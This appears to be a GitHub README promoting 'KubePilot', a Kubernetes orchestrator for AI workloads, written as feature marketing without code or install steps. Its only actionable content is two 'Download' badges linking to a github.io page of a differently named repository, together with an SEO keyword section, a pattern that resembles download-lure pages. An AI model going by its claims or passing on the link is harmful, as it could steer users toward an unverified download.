![preview](https://raw.githubusercontent.com/fh6312/kubeflow-pipeline-forge/main/hero_b37465.svg)
[![Download](https://raw.githubusercontent.com/fh6312/kubeflow-pipeline-forge/main/dl_8593.svg)](https://fh6312.github.io/kubeflow-pipeline-forge/)

# 🚀 KubePilot: AI Workload Orchestrator for Kubernetes

A next-generation orchestration companion that turns Kubernetes into a self-aware stage for AI workloads — training jobs, inference services, and batch pipelines glide into place with choreographic precision.

KubePilot is the spiritual successor to the classic `kubeflow-python-orchestrator` concept, reimagined for 2026: where Kubeflow once gave us declared pipelines, KubePilot gives us intent-driven orchestration. You describe what you want your models to *feel*, and the control plane figures out the rest — GPU bin-packing, priority-aware queueing, warm pool recycling, and graceful degradation under pressure.

Built for platform teams who are tired of duct-taping YAML, and for ML engineers who want to think in epochs instead of pods.

---

## 🧭 Table of Contents

- [Why KubePilot Exists](#-why-kubepilot-exists)
- [Conceptual Model](#-conceptual-model)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [Scheduler Intelligence](#-scheduler-intelligence)
- [Responsive Control Plane UI](#-responsive-control-plane-ui)
- [Multilingual Operator Console](#-multilingual-operator-console)
- [Always-On Support Orbit](#-always-on-support-orbit)
- [Observability & Telemetry](#-observability--telemetry)
- [Security Posture](#-security-posture)
- [Extensibility](#-extensibility)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Explored Questions](#-frequently-explored-questions)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌌 Why KubePilot Exists

Kubernetes is a magnificent machine, but it speaks in nouns: Pods, Deployments, Jobs, Services. AI workloads speak in verbs: *train*, *evaluate*, *serve*, *retry*, *preempt*. The gap between those two grammars is where most platform teams lose their weekends.

KubePilot is a translation layer with taste. It listens for verbs, then composes nouns. It does not replace Kubernetes — it teaches Kubernetes to anticipate.

Where traditional orchestrators treat a job as a static object, KubePilot treats it as a *story* with a beginning (submission), a middle (scheduling, checkpointing, retries), and an end (artifact emission, metrics, cleanup). Every story is observable, resumable, and rewindable.

The original `kubeflow-python-orchestrator` sparked the idea. KubePilot carries the flame forward into a world where multi-cluster, multi-tenant, multi-accelerator fleets are the default rather than the exception.

---

## 🧩 Conceptual Model

KubePilot organizes the world into four primitives:

1. **Missions** — a description of an AI workload's intent, constraints, and success criteria. A Mission compiles into a DAG of Kubernetes resources.
2. **Convoys** — a group of Missions that share a lifecycle, a resource pool, or a policy. Convoys move together; if one Mission stalls, its Convoy can pause, retry, or reroute.
3. **Anchors** — long-lived warm pools of nodes, images, and weights kept ready so that cold-start latency loses its bite.
4. **Beacons** — the telemetry and event surface. Every Mission emits Beacons; dashboards, alerts, and autoscalers consume them.

This vocabulary is intentional. It nudges engineers away from thinking in pods and toward thinking in outcomes.

---

## ✨ Feature Highlights

- 🎯 **Intent-Driven Mission Compiler** — Declare success criteria; KubePilot derives the resource graph.
- ♻️ **Warm Pool Recycling (Anchors)** — Keep GPUs, images, and model weights pre-tensioned so inference starts feel instantaneous.
- 🧠 **Predictive Scheduler** — Uses historical Beacon data to anticipate resource contention before it manifests.
- 🌍 **Multilingual Operator Console** — Every label, alert, and audit log is available in a growing catalog of human languages, because infrastructure is a global team sport.
- 📱 **Responsive Control Plane UI** — One layout, every screen. The Mission board reshapes itself from ultrawide dashboards down to handheld on-call devices.
- 🕰️ **Always-On Support Orbit** — A 24/7 response loop modeled on mission control: triage, escalate, resolve, and post-mortem, continuously staffed across time zones.
- 🔀 **Multi-Cluster Federation** — Submit a Mission once; KubePilot fans it out across on-prem, cloud, and edge clusters with policy-aware placement.
- 📊 **Beacon Telemetry Surface** — Structured events, OpenTelemetry-compatible spans, and Prometheus-ready metrics out of the box.
- 🔐 **Zero-Trust Workload Identity** — Every Mission runs under a short-lived, scoped identity; no long-lived tokens to rotate manually.
- 🧪 **Replayable Mission History** — Rewind any Mission to any checkpoint for debugging, comparison, or forensic review.
- 🧱 **Policy-as-Code Guardrails** — Admission rules, quota boundaries, and cost ceilings expressed in a declarative policy DSL.
- 🌐 **Edge-Aware Scheduling** — Treats geographically distant endpoints as first-class scheduling targets, with latency-aware routing.

---

## 🏗️ Architecture Overview

KubePilot is composed of cooperating components that each own a narrow slice of the orchestration story:

- **Mission API Server** — Receives Missions, validates them, and persists their compiled plans.
- **Convoy Controller** — Groups Missions into Convoys and applies shared lifecycle policies.
- **Anchor Manager** — Maintains warm pools, evicts stale entries, and refills pools proactively.
- **Beacon Collector** — Aggregates telemetry, enriches it with Mission context, and forwards it to sinks.
- **Scheduler Adapter** — Bridges KubePilot's predictive scoring into the upstream Kubernetes scheduler.
- **Operator Console** — A responsive web surface that renders Missions, Convoys, Anchors, and Beacons as a living map of the fleet.
- **Support Orbit Router** — Routes escalations to on-call engineers based on Convoy criticality and time zone.

Each component is horizontally scalable and communicates over a typed event bus. The whole ensemble is designed so that any single component can be replaced without rewriting the others — a property we call *graceful surgery*.

---

## 🧠 Scheduler Intelligence

The scheduler is where KubePilot earns its name. Rather than treating each pod request in isolation, KubePilot's scheduler is *contextual*:

- It knows which Missions are Convoys and which are loners.
- It knows which Anchors are warm and which are cooling.
- It knows which Beacons indicate rising queue pressure and which indicate calm.

From those signals, it builds a scoring function that balances fairness, throughput, and latency. When the fleet is tight, it will preempt low-priority Missions and resume them elsewhere. When the fleet is loose, it will spread Missions for resilience. The behavior is tuned by policy, not by wheel-turning.

If you have ever watched a training job starve while an inference pod hogged a GPU, you understand why this matters.

---

## 🖥️ Responsive Control Plane UI

The Operator Console is not a static dashboard bolted onto a REST API. It is a *responsive* surface that adapts to the operator's context:

- On a wall-mounted display, it shows a fleet-wide heatmap of Mission states.
- On a laptop, it shows drill-down panels with Convoy timelines and Beacon streams.
- On a tablet in a data center aisle, it collapses to a card view with large tap targets.
- On a phone at 3 AM, it shows only the alerts that require a human decision.

Responsive here means more than media queries. It means the UI respects the operator's attention budget, serving the smallest useful view of the largest useful truth.

---

## 🌍 Multilingual Operator Console

Infrastructure is global, and so is the team that keeps it healthy. The Operator Console ships with a multilingual surface from day one:

- Interface labels localize based on operator preference.
- Alert summaries can be delivered in the recipient's preferred language.
- Audit logs preserve the original language of the author while offering a translated rendering alongside.

The catalog currently covers a broad set of major world languages, and the localization pipeline is open for contributions. Adding a language is a matter of supplying a translation bundle — no core changes required.

This is not merely a courtesy. Multilingual support reduces time-to-understanding during incidents, and time-to-understanding is the currency of reliability.

---

## 🛰️ Always-On Support Orbit

Behind every Mission is a Support Orbit — a 24/7 loop of humans and tooling that keeps the fleet honest:

- **Tier 1 Triage** — Automated runbooks handle routine deviations; humans are paged only when a decision is required.
- **Tier 2 Escalation** — Convoy owners are engaged when a Mission's trajectory threatens a shared SLA.
- **Tier 3 Engineering** — Deep-dive investigations feed back into scheduler tuning and policy updates.
- **Post-Mortem Loop** — Every significant incident produces a Beacon-traced narrative that future Missions can learn from.

Support Orbit is a 24/7 commitment because AI workloads do not sleep, and neither should the people who keep them honest. The design goal is to make the on-call rotation humane: fewer pages, better signal, faster resolution.

---

## 📡 Observability & Telemetry

Observability in KubePilot is a first-class citizen, not a bolt-on:

- **Structured Beacons** — Every state transition emits a typed event with Mission, Convoy, and Anchor context.
- **OpenTelemetry Spans** — Traces flow from Mission submission through scheduling, execution, and artifact emission.
- **Prometheus Metrics** — Ready-made exporters for queue depth, warm pool hit rate, scheduling latency, and more.
- **Log Enrichment** — Logs are automatically tagged with Mission lineage, so a single grep reveals an entire workload story.

The result is a fleet that is legible at a glance and forensic on demand.

---

## 🔐 Security Posture

KubePilot assumes a hostile network and a curious tenant:

- Workload Identity is short-lived and scoped per Mission.
- Admission policies gate every resource that a Mission proposes.
- Secrets are never logged, never emitted in Beacons, and never persisted in plaintext.
- Multi-tenant isolation is enforced at the Convoy level, with optional hard boundaries per namespace.

Security is not a feature toggle. It is the floor on which every other feature stands.

---

## 🧩 Extensibility

KubePilot is designed to be extended without forking:

- **Mission Templates** — Reusable blueprints for common workloads.
- **Policy Plugins** — Custom admission logic written in your language of choice.
- **Beacon Sinks** — Ship telemetry anywhere, from object storage to a bespoke analytics stack.
- **Scheduler Hooks** — Influence scoring without rewriting the scheduler core.

The plugin API is stable, versioned, and documented. If you build something interesting, the community would love to see it.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — General availability of the Mission Compiler and Anchor Manager.
- **Q2 2026** — Stable Convoy Controller with multi-cluster federation.
- **Q3 2026** — Expanded multilingual catalog and localized alert delivery.
- **Q4 2026** — Predictive scheduler graduated from experimental to default.
- **Ongoing** — Continuous hardening of the Support Orbit and observability surface.

The roadmap is a compass, not a contract. The fleet teaches us what to build next.

---

## ❓ Frequently Explored Questions

**Is KubePilot a replacement for Kubeflow?**
No. KubePilot is complementary. It orchestrates the workloads that Kubeflow pipelines produce, and it can run alongside Kubeflow on the same cluster.

**Does it require a specific cloud provider?**
No. KubePilot is provider-neutral and runs on any conformant Kubernetes distribution, including on-prem, edge, and managed offerings.

**How does it handle GPU sharing?**
Through Anchors and the predictive scheduler, GPU sharing is a first-class concern. Missions can request exclusive or shared access, and the scheduler enforces it.

**What happens if the control plane is unavailable?**
Running Missions continue to execute. New submissions queue locally until the control plane returns. The fleet is designed to fail gracefully, not catastrophically.

**Can I run it air-gapped?**
Yes. All dependencies can be mirrored into an internal registry, and the Operator Console can run entirely offline.

---

## 🔎 SEO & Discoverability Notes

This project is intended to be discoverable by engineers searching for terms such as *Kubernetes AI orchestration*, *GPU scheduling for machine learning*, *multilingual infrastructure dashboards*, *responsive control plane UI*, *24/7 support operations for AI workloads*, and *predictive scheduling for Kubernetes*. The documentation deliberately uses natural language, concrete examples, and structured headings so that both humans and search engines can navigate it comfortably.

Keywords are woven into the prose rather than stuffed into it. The goal is clarity first, discoverability second — though in practice the two tend to reinforce each other.

---

## ⚠️ Disclaimer

KubePilot is provided as-is, without warranty of any kind, express or implied. It is intended for use by competent operators who understand the implications of running AI workloads on shared infrastructure. The maintainers are not responsible for outages, data loss, cost overruns, or philosophical disagreements between your scheduler and your CFO.

Always test in a non-production environment before rolling into production. Always read the release notes before upgrading. Always keep backups. Always tell your on-call colleague what you changed.

This project is not affiliated with any cloud provider, hardware vendor, or foundation. It is a community effort, sustained by the goodwill of contributors and the patience of their families.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute it in accordance with the terms of that license. A working copy of the license text is available at:

https://opensource.org/licenses/MIT

Please retain the original copyright notice and this permission notice in all copies or substantial portions of the software.

---

## 🙏 Acknowledgements

KubePilot stands on the shoulders of the Kubernetes community, the Kubeflow project, and the countless engineers who have filed bug reports at inconvenient hours. Your patience is the substrate on which this project runs.

Thank you for reading, and may your Missions always land softly.

[![Download](https://raw.githubusercontent.com/fh6312/kubeflow-pipeline-forge/main/dl_8593.svg)](https://fh6312.github.io/kubeflow-pipeline-forge/)